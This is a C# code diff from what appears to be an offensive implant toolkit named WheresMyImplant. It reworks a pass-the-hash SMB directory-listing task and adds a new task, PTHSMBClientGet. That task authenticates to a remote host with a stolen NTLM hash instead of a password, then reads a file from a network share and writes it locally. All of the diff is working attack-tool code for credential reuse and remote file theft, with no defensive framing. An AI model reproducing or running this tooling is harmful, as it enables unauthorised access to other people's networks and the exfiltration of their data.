@@ -190,15 +190,16 @@ namespace WheresMyImplant
         */
 
         [ManagementTask]
-        public static String PTHSMBClient(String uncPath, String domain, String username, String hash)
+        public static String PTHSMBClientList(String uncPath, String domain, String username, String hash)
         {
             StringBuilder output = new StringBuilder();
             using (SMBClient smbClient = new SMBClient())
             {
-                String target, share, folder;
+                String target, share, folder = String.Empty;
                 try
                 {
-                    var enumerator = uncPath.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries).GetEnumerator();
+                    System.Collections.IEnumerator enumerator = uncPath.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries).GetEnumerator();
+
                     if (!enumerator.MoveNext())
                         return "Invalid UNC Path";
                     target = (String)enumerator.Current;
@@ -207,7 +208,12 @@ namespace WheresMyImplant
                         return "Invalid UNC Path";
                     share = (String)enumerator.Current;
 
-                    folder = enumerator.MoveNext() ? (String)enumerator.Current : String.Empty;
+                    StringBuilder sbFolder = new StringBuilder();
+                    while (enumerator.MoveNext())
+                    {
+                        sbFolder.Append((String)enumerator.Current + @"\");
+                    }
+                    folder = sbFolder.ToString();
                 }
                 catch (Exception ex)
                 {
@@ -242,6 +248,78 @@ namespace WheresMyImplant
                     }
                     smbClient.FindRequest(folder);
                     smbClient.ParseDirectoryContents();
+                    smbClient.CloseRequest();
+                    smbClient.DisconnectTree();
+                }
+                catch (Exception ex)
+                {
+                    output.Append(ex.ToString());
+                }
+                finally
+                {
+                    output.Append(smbClient.GetOutput());
+                }
+            }
+            return output.ToString();
+        }
+
+        [ManagementTask]
+        public static String PTHSMBClientGet(String uncPathSource, String destination, String domain, String username, String hash)
+        {
+            StringBuilder output = new StringBuilder();
+            using (SMBClientGet smbClient = new SMBClientGet())
+            {
+                String target, share, folder, file = String.Empty;
+                try
+                {
+                    String[] path = uncPathSource.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
+                    var enumerator = path.GetEnumerator();
+
+                    if (!enumerator.MoveNext())
+                        return "Invalid UNC Path";
+                    target = (String)enumerator.Current;
+
+                    if (!enumerator.MoveNext())
+                        return "Invalid UNC Path";
+                    share = (String)enumerator.Current;
+
+                    StringBuilder sbFolder = new StringBuilder();
+                    for (Int32 i = 2; i < path.Length - 1; i++)
+                        sbFolder.Append(path[i] + @"\");
+                    folder = sbFolder.ToString();
+                    file = path.Last();
+                }
+                catch (Exception ex)
+                {
+                    return ex.ToString();
+                }
+
+                if (!smbClient.Connect(target))
+                    return "[-] Unable to Connect";
+
+                smbClient.NegotiateSMB();
+                smbClient.NegotiateSMB2();
+                smbClient.NTLMSSPNegotiate();
+
+                if (!smbClient.Authenticate(domain, username, hash))
+                    return "[-] Login Failed";
+
+                try
+                {
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
+                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
+                    smbClient.CreateRequestGet(folder + file);
+                    smbClient.CloseRequest();
+                    smbClient.CreateRequestGet(folder);
+                    smbClient.FindRequestGet();                   
+                    smbClient.CreateRequestGet(folder + file);
+                    smbClient.ReadRequestGet();
+                    smbClient.CreateRequestGet(folder + file);
+                    smbClient.InfoRequestGet1();
+                    smbClient.InfoRequestGet2();
+                    smbClient.ReadRequestGet();
+                    smbClient.WriteFile(destination);
                     smbClient.CloseRequest();
                     smbClient.DisconnectTree();
                 }
